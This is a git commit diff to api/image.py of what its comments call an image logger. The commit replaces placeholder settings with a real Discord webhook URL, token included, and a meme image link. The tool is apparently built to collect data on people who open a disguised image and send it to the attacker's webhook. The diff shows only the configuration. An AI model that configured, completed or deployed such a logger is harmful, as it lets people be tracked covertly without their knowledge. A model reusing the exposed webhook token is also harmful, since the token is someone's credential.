d8e23aeea9d69ef3e571ead51ff0e79c9a3bfb0a
DarkWingDuck231 <forfreerust@gmail.com>
2025-02-01 13:08:47 -0600

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335325684041519165/PCqU72egQ2wTl3tOydKOrlv8hX-CS5y5NXTEnRTFX8Qnw-Wcf6D3t7kOq_vqmaMfTE7G",
+    "image": "https://theawesomedaily.com/wp-content/uploads/2017/11/i-see-stupid-people-meme-11-1.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
